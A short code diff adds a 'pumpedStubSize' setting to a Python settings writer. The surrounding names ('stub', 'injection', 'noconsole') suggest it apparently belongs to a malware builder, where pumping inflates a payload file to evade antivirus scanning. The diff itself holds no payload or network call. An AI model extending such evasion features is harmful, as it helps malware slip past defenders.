@@ -57,6 +57,13 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
             if os.path.isfile("noconsole"):
                 os.remove("noconsole")
     
+    pumpedStubSize = settings["settings"]["pumpedStubSize"]
+    if pumpedStubSize > 0:
+        with open("pumpStub", "w") as file:
+            file.write(str(pumpedStubSize))
+    elif os.path.isfile("pumpStub"):
+        os.remove("pumpStub")
+    
     return code
 
 def ReadSettings() -> tuple[dict, str]:
